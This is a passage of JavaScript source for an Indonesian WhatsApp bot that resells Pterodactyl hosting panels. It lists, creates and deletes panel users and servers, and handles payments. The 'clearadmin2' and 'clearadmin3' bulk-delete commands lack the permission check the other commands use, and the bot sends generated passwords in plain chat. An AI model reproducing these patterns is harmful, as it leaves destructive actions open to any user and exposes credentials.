 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: '❀SalwaCantik❀',
 body: 'Simple Bot WhatsApp.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });

 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat mengambil data admin server 3.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'listuser2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let page = parseInt(args[0]) || 1; // Default halaman ke 1 jika tidak ada input
 
 try {
 let f = await fetch(global.domain2 + "/api/application/users?page=" + page, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2
 }
 });

 let res = await f.json();
 if (res.errors) return m.reply(`❌ Gagal mengambil data user: ${JSON.stringify(res.errors[0], null, 2)}`);
 
 let users = res.data;
 if (!users || users.length === 0) return m.reply("❌ Tidak ada user yang ditemukan di server 2.");

 let messageText = "*Berikut adalah daftar user di Server 2:*\n\n";
 for (let user of users) {
 let u = user.attributes;
 messageText += `🆔 *ID*: ${u.id} - *Status*: ${u.server_limit === null ? 'Tidak aktif' : 'Aktif'}\n`;
 messageText += `👤 *Username*: ${u.username}\n`;
 messageText += `📌 *Nama*: ${u.first_name} ${u.last_name}\n\n`;
 }

 messageText += `📄 *Halaman*: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
 messageText += `🖥️ *Total User*: ${res.meta.pagination.total}\n`;

 // Kirim pesan
 await cupen.sendMessage(m.chat, { text: messageText }, { quoted: m });

 // Navigasi ke halaman berikutnya
 if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
 m.reply(`➡️ Gunakan perintah *${prefix + command} ${parseInt(res.meta.pagination.current_page) + 1}* untuk melihat halaman selanjutnya.`);
 }
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat mengambil data user di server 2.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'deladmin2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (!args[0]) return m.reply(`Untuk melihat ID, silakan ketik ${prefix}listadmin2`);
 
 try {
 // Ambil daftar admin dari server 2
 let cek = await fetch(global.domain2 + "/api/application/users?page=1", {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2
 }
 });

 let res2 = await cek.json();
 let users = res2.data;
 let getid = null;
 let idadmin = null;

 // Looping untuk mencari admin berdasarkan ID
 for (let e of users) {
 if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
 getid = e.attributes.username;
 idadmin = e.attributes.id;

 // Hapus admin menggunakan ID yang ditemukan
 try {
 let delusr = await fetch(global.domain2 + `/api/application/users/${idadmin}`, {
 method: "DELETE",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2
 }
 });

 // Validasi apakah penghapusan berhasil
 if (!delusr.ok) {
 throw new Error('Gagal menghapus admin!');
 }

 m.reply(`✅ Berhasil menghapus admin panel *${getid}* dari server 2.`);
 } catch (err) {
 console.error(err);
 m.reply(`❌ Terjadi kesalahan saat mencoba menghapus admin: ${err.message}`);
 }
 break;
 }
 }

 // Jika ID admin tidak ditemukan
 if (!getid) {
 m.reply("❌ Admin dengan ID tersebut tidak ditemukan di server 2 atau bukan root admin.");
 }
 } catch (err) {
 console.error(err);
 m.reply(`❌ Terjadi kesalahan saat mencoba mengambil data admin: ${err.message}`);
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'delserver2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let srv = args[0]; // ID server yang ingin dihapus
 if (!srv) return m.reply('ID servernya mana?');

 try {
 // Kirim permintaan DELETE ke API server 2
 let f = await fetch(global.domain2 + "/api/application/servers/" + srv, {
 method: "DELETE",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2
 }
 });

 // Cek respons
 if (f.ok) {
 m.reply('✅ Sukses menghapus server dari server 2!');
 } else {
 let res = await f.json();
 let errorMessage = res.errors?.[0]?.detail || 'Server tidak ditemukan!';
 m.reply(`❌ Gagal menghapus server dari server 2: ${errorMessage}`);
 }
 } catch (e) {
 console.error(e);
 m.reply('❌ Terjadi kesalahan saat menghapus server dari server 2.');
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'deladmin3': {
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
    if (!args[0]) return m.reply(`Untuk melihat ID, silakan ketik ${prefix}listadmin3`);
    
    try {
        // Ambil daftar admin dari server 3
        let cek = await fetch(global.domain3 + "/api/application/users?page=1", {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + global.apikey3
            }
        });

        let res3 = await cek.json();
        let users = res3.data;
        let getid = null;
        let idadmin = null;

        // Looping untuk mencari admin berdasarkan ID
        for (let e of users) {
            if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
                getid = e.attributes.username;
                idadmin = e.attributes.id;

                // Hapus admin menggunakan ID yang ditemukan
                try {
                    let delusr = await fetch(global.domain3 + `/api/application/users/${idadmin}`, {
                        method: "DELETE",
                        headers: {
                            Accept: "application/json",
                            "Content-Type": "application/json",
                            Authorization: "Bearer " + global.apikey3
                        }
                    });

                    // Validasi apakah penghapusan berhasil
                    if (!delusr.ok) {
                        throw new Error('Gagal menghapus admin!');
                    }

                    m.reply(`✅ Berhasil menghapus admin panel *${getid}* dari server 3.`);
                } catch (err) {
                    console.error(err);
                    m.reply(`❌ Terjadi kesalahan saat mencoba menghapus admin: ${err.message}`);
                }
                break;
            }
        }

        // Jika ID admin tidak ditemukan
        if (!idadmin) {
            m.reply(`❌ Tidak ditemukan admin dengan ID ${args[0]} di server 3.`);
        }
    } catch (error) {
        console.error(error);
        m.reply(`❌ Terjadi kesalahan: ${error.message}`);
    }
    break;
}
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'deluser2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let usr = args[0]; // ID user yang ingin dihapus
 if (!usr) return m.reply('ID usernya mana?');

 try {
 // Kirim permintaan DELETE ke API server 2
 let f = await fetch(global.domain2 + "/api/application/users/" + usr, {
 method: "DELETE",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2
 }
 });

 // Cek respons
 if (f.ok) {
 m.reply('✅ Sukses menghapus user dari server 2!');
 } else {
 let res = await f.json();
 let errorMessage = res.errors?.[0]?.detail || 'User tidak ditemukan!';
 m.reply(`❌ Gagal menghapus user dari server 2: ${errorMessage}`);
 }
 } catch (e) {
 console.error(e);
 m.reply('❌ Terjadi kesalahan saat menghapus user dari server 2.');
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'deluser3': {
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
    let usr = args[0]; // ID user yang ingin dihapus
    if (!usr) return m.reply('ID usernya mana?');

    try {
        // Kirim permintaan DELETE ke API server 3
        let f = await fetch(global.domain3 + "/api/application/users/" + usr, {
            method: "DELETE",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + global.apikey3
            }
        });

        // Cek respons
        if (f.ok) {
            m.reply('✅ Sukses menghapus user dari server 3!');
        } else {
            let res = await f.json();
            let errorMessage = res.errors?.[0]?.detail || 'User tidak ditemukan!';
            m.reply(`❌ Gagal menghapus user dari server 3: ${errorMessage}`);
        }
    } catch (e) {
        console.error(e);
        m.reply('❌ Terjadi kesalahan saat menghapus user dari server 3.');
    }
    break;
}
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'clearadmin2': {
    const argsString = body.trim();
    const excludeIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludeIds.length === 0) {
        return m.reply('Tolong masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: .clearadmin2 , 48, 49, 50');
    }

    try {
        // Mengambil data user dari server 2
        let f = await fetch(global.domain2 + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikey2
            }
        });

        let res = await f.json();
        let users = res.data;

        if (!users || users.length === 0) {
            return m.reply('Tidak ada user yang ditemukan di server 2.');
        }

        for (let user of users) {
            let u = user.attributes;

            // Jika ID user ada di daftar pengecualian, lewati
            if (excludeIds.includes(u.id.toString())) {
                m.reply(`Mengabaikan user dengan ID: ${u.id} (${u.username})\n> *_© Developer : ❀SalwaCantik❀_*`);
                continue;
            }

            // Menghapus user dari server 2
            let deleteUser = await fetch(global.domain2 + "/api/application/users/" + u.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + global.apikey2
                }
            });

            if (deleteUser.ok) {
                m.reply(`Berhasil menghapus user dengan ID: ${u.id} (${u.username})\n> *_© Developer : ❀SalwaCantik❀_*`);
            } else {
                let errorText = await deleteUser.text();
                m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
            }
        }

        m.reply('Semua user, kecuali yang dikecualikan, berhasil dihapus di server 2!');
    } catch (error) {
        return m.reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'delserver3': {
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
    let srv = args[0]; // ID server yang ingin dihapus
    if (!srv) return m.reply('ID servernya mana?');

    try {
        // Kirim permintaan DELETE ke API server 3
        let f = await fetch(global.domain3 + "/api/application/servers/" + srv, {
            method: "DELETE",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: "Bearer " + global.apikey3
            }
        });

        // Cek respons
        if (f.ok) {
            m.reply('✅ Sukses menghapus server dari server 3!');
        } else {
            let res = await f.json();
            let errorMessage = res.errors?.[0]?.detail || 'Server tidak ditemukan!';
            m.reply(`❌ Gagal menghapus server dari server 3: ${errorMessage}`);
        }
    } catch (e) {
        console.error(e);
        m.reply('❌ Terjadi kesalahan saat menghapus server dari server 3.');
    }
    break;
}
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'clearadmin3': {
    const argsString = body.trim();
    const excludeIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludeIds.length === 0) {
        return m.reply('Tolong masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: .clearadmin3 , 48, 49, 50');
    }

    try {
        // Mengambil data user dari server 3
        let f = await fetch(global.domain3 + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikey3
            }
        });

        let res = await f.json();
        let users = res.data;

        if (!users || users.length === 0) {
            return m.reply('Tidak ada user yang ditemukan di server 3.');
        }

        for (let user of users) {
            let u = user.attributes;

            // Jika ID user ada di daftar pengecualian, lewati
            if (excludeIds.includes(u.id.toString())) {
                m.reply(`Mengabaikan user dengan ID: ${u.id} (${u.username})\n> *_© Developer : ❀SalwaCantik❀_*`);
                continue;
            }

            // Menghapus user dari server 3
            let deleteUser = await fetch(global.domain3 + "/api/application/users/" + u.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + global.apikey3
                }
            });

            if (deleteUser.ok) {
                m.reply(`Berhasil menghapus user dengan ID: ${u.id} (${u.username})\n> *_© Developer : ❀SalwaCantik❀_*`);
            } else {
                let errorText = await deleteUser.text();
                m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
            }
        }

        m.reply('Semua user, kecuali yang dikecualikan, berhasil dihapus di server 3!');
    } catch (error) {
        return m.reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'clearuser': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 try {
 // Mengambil daftar user
 let f = await fetch(domain + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return m.reply('Tidak ada user yang ditemukan.');
 }

 // Loop melalui setiap user
 for (let user of users) {
 let u = user.attributes;

 // Hanya hapus user yang bukan admin (root_admin = false)
 if (!u.root_admin) {
 let deleteUser = await fetch(domain + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + apikey,
 }
 });

 // Cek status penghapusan user
 if (deleteUser.ok) {
 m.reply(`*Berhasil menghapus user dengan ID: ${u.id}*`);
 } else {
 let errorText = await deleteUser.text();
 m.reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 }

 m.reply('*Semua user kecuali admin berhasil dihapus!*');
 } catch (error) {
 return m.reply('Terjadi kesalahan: ' + error.message);
 }
 break;
}
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'clearuser2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 try {
 // Mengambil daftar user dari server 2
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey2,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return m.reply('Tidak ada user yang ditemukan di server 2.');
 }

 // Loop melalui setiap user
 for (let user of users) {
 let u = user.attributes;

 // Hanya hapus user yang bukan admin (root_admin = false)
 if (!u.root_admin) {
 let deleteUser = await fetch(global.domain2 + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey2,
 }
 });

 // Cek status penghapusan user
 if (deleteUser.ok) {
 m.reply(`*Berhasil menghapus user dengan ID: ${u.id}* dari server 2`);
 } else {
 let errorText = await deleteUser.text();
 m.reply(`Gagal menghapus user dengan ID: ${u.id} dari server 2. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 }

 m.reply('*Semua user kecuali admin berhasil dihapus dari server 2!*');
 } catch (error) {
 return m.reply('Terjadi kesalahan: ' + error.message);
 }
 break;
}

case 'clearuser3': {
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');

    try {
        // Mengambil daftar user dari server 3
        let f = await fetch(global.domain3 + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikey3,
            }
        });

        let res = await f.json();
        let users = res.data;

        if (!users || users.length === 0) {
            return m.reply('Tidak ada user yang ditemukan di server 3.');
        }

        // Loop melalui setiap user
        for (let user of users) {
            let u = user.attributes;

            // Hanya hapus user yang bukan admin (root_admin = false)
            if (!u.root_admin) {
                let deleteUser = await fetch(global.domain3 + "/api/application/users/" + u.id, {
                    method: "DELETE",
                    headers: {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + global.apikey3,
                    }
                });

                // Cek status penghapusan user
                if (deleteUser.ok) {
                    m.reply(`*Berhasil menghapus user dengan ID: ${u.id}* dari server 3`);
                } else {
                    let errorText = await deleteUser.text();
                    m.reply(`Gagal menghapus user dengan ID: ${u.id} dari server 3. Error: ${deleteUser.status} - ${errorText}`);
                }
            }
        }

        m.reply('*Semua user kecuali admin berhasil dihapus dari server 3!*');
    } catch (error) {
        return m.reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'delchat': {
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
if (m.quoted.sender == botNumber) {
cupen.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
m.reply("*[ System Notice ]* Done Membatalkan Membeli")
} else {
cupen.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
m.reply("*[ System Notice ]* Done Menghapus Teks")
}}
break
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'payment':
{
let imgdana = await prepareWAMessageMedia({ image: fs.readFileSync("./media/thumbnail.jpg")}, { upload: cupen.waUploadToServer })
let imgovo = await prepareWAMessageMedia({ image: fs.readFileSync("./media/thumbnail.jpg")}, { upload: cupen.waUploadToServer })
let imggopay = await prepareWAMessageMedia({ image: fs.readFileSync("./media/thumbnail.jpg")}, { upload: cupen.waUploadToServer })
let imgqris = await prepareWAMessageMedia({ image: fs.readFileSync("./media/thumbnail.jpg")}, { upload: cupen.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "\nPilih salah satu *payment* pembayaran yang tersedia"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgdana
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Dana Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.dana}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgovo
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"OVO Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.ovo}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imggopay
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Gopay Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.gopay}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgqris
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\" QRIS Payment\",\"url\":\"${global.qris}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}
]
})
})}
}}, {userJid: m.sender, quoted: qtoko})
await cupen.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
break

//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'done': {
    try {
        // Validasi input
        if (!text) return m.reply('*[ System Notice ]* Format salah! Contoh: .done Nama Barang, Harga, Via Pembayaran');
        const args = text.split(',');
        if (args.length < 3) return m.reply('*[ System Notice ]* Pastikan formatnya sesuai! Contoh: .done Nama Barang, Harga, Via Pembayaran');

        const [namaBarang, harga, viaPembayaran] = args.map(arg => arg.trim());

        // Tanggal otomatis
        const currentDate = new Date();
        const options = { timeZone: 'Asia/Jakarta', year: 'numeric', month: 'long', day: 'numeric' };
        const formattedDate = currentDate.toLocaleDateString('id-ID', options);

        // Link video (GIF)
        const videoUrl = 'https://files.catbox.moe/et30hu.jpg';

        // Format pesan
        const teks = `┌───「 *Detail Transaksi* 」───
│ *Nama Barang*: ${namaBarang}
│ *Harga*: ${harga}
│ *Via Pembayaran* :  ${viaPembayaran}
│ *Tanggal* :  ${formattedDate}
│*Testi* : ${global.link}
└───────────────────
*[INFO]* Terima Kasih Sudah Mempercayai Kami`;

        // Kirim pesan dengan tampilan chat
        await cupen.sendMessage(m.chat, {
            video: { url: videoUrl },
            caption: teks,
            gifPlayback: true,
            gifAttribution: 1,
            contextInfo: {
                mentionedJid: [m.sender],
                externalAdReply: {
                    showAdAttribution: true,
                    title: 'Transaksi Selesai',
                    body: '❀SalwaCantik❀',
                    mediaType: 1,
                    renderLargerThumbnail: false,
                },
            },
        }, { quoted: m });

    } catch (error) {
        console.error('Error in done case:', error);
        return m.reply('Terjadi kesalahan. Silakan coba lagi atau hubungi admin.');
    }
    break;
}
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'unli-2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli2
 let memo = "0"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain2 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain2 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli2
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain2}
└───────────────────
> *_© Developer : ❀SalwaCantik❀_*`;

 await cupen.sendMessage(u, {
 video: { url: "https://files.catbox.moe/et30hu.jpg" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://files.catbox.moe/fh0a6r.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'unli-3': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli3
 let memo = "0"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain3 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain3 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain3 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli3
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain3}
└───────────────────
> *_© Developer : ❀SalwaCantik❀_*`;

 await cupen.sendMessage(u, {
 video: { url: "https://files.catbox.moe/et30hu.jpg" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://files.catbox.moe/fh0a6r.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'updomain3':{
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text;
 global.domain3 = newteks;

 await cupen.sendMessage(m.chat, { text: "_Berhasil Mengganti Domain Panel✅_" }, { quoted: m });
 } else {
 await cupen.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Domain>` }, { quoted: m });
 }
}
break
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'upapikey3':{
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (!text && !m.quoted) return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);

 const newteks = m.quoted ? m.quoted.text : text;

 if (newteks) {
 global.apikey3 = newteks;
 return cupen.sendMessage(m.chat, { text: "_Berhasil Mengganti Apikey Panel✅_" });
 } else {
 return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);
 }
}
break
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'upcapikey3':{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 if (text || m.quoted) {
